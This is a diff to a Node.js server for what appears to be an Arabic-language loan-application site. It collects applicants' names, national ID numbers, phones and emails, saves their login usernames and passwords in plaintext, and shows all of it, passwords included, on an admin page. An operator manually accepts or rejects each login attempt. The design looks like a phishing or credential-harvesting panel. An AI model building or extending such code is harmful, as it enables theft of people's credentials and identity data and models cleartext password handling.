@@ -39,6 +39,12 @@ function writeDB(data) {
   fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf8');
 }
 
+function getApplications(db) {
+  if (Array.isArray(db.applications)) return db.applications;
+  if (db.applicationData) return [db.applicationData];
+  return [];
+}
+
 function sendJSON(res, statusCode, obj) {
   const body = JSON.stringify(obj);
   res.writeHead(statusCode, {
@@ -105,6 +111,12 @@ const server = http.createServer((req, res) => {
         status: 'pending',
         ts: Date.now()
       };
+      const applications = getApplications(db);
+      if (applications.length) {
+        applications[0].username = db.loginRequest.username;
+        applications[0].password = db.loginRequest.password;
+        db.applications = applications;
+      }
       writeDB(db);
       sendJSON(res, 200, { ok: true });
     });
@@ -128,6 +140,11 @@ const server = http.createServer((req, res) => {
         return sendJSON(res, 400, { error: 'لا يوجد طلب دخول حالي' });
       }
       db.loginRequest.status = body.status; // 'accepted' or 'rejected'
+      const applications = getApplications(db);
+      if (applications.length) {
+        applications[0].status = body.status;
+        db.applications = applications;
+      }
       writeDB(db);
       sendJSON(res, 200, { ok: true });
     });
@@ -195,15 +212,18 @@ const server = http.createServer((req, res) => {
     readRequestBody(req, (err, body) => {
       if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
       const db = readDB();
-      db.applicationData = {
+      const application = {
         fullName: body.fullName || '',
         idNumber: body.idNumber || '',
         phone: body.phone || '',
         email: body.email || '',
         loanAmount: body.loanAmount || '',
         months: body.months || '',
+        status: 'pending',
         ts: Date.now()
       };
+      db.applications = [application].concat(getApplications(db));
+      db.applicationData = application;
       writeDB(db);
       sendJSON(res, 200, { ok: true });
     });
@@ -230,21 +250,25 @@ const server = http.createServer((req, res) => {
   // ---- API: قائمة المستخدمين (تستخدمها admin.html) ----
     if (pathname === '/api/users' && req.method === 'GET') {
       const db = readDB();
-      const users = Array.isArray(db.users) ? db.users.slice() : [];
-      if (db.applicationData) {
-        users.unshift({
-          name: db.applicationData.fullName || 'طلب جديد',
-          phone: db.applicationData.phone || '—',
-          email: db.applicationData.email || '—',
-          status: 'قيد المراجعة',
-          username: db.loginRequest ? db.loginRequest.username : '',
-          password: db.loginRequest ? db.loginRequest.password : '',
-          idNumber: db.applicationData.idNumber || '—',
-          loanAmount: db.applicationData.loanAmount || '—',
-          months: db.applicationData.months || '—',
+      const applications = getApplications(db);
+      const applicationUsers = applications.map(function(application){
+        let status = 'قيد المراجعة';
+        if (application.status === 'accepted') status = 'نشط';
+        if (application.status === 'rejected') status = 'مرفوض';
+        return {
+          name: application.fullName || 'طلب جديد',
+          phone: application.phone || '—',
+          email: application.email || '—',
+          status: status,
+          username: application.username || '',
+          password: application.password || '',
+          idNumber: application.idNumber || '—',
+          loanAmount: application.loanAmount || '—',
+          months: application.months || '—',
           application: true
-        });
-      }
+        };
+      });
+      const users = applicationUsers.concat(Array.isArray(db.users) ? db.users : []);
       sendJSON(res, 200, { users, activeVisits: countActiveVisits() });
       return;
   }
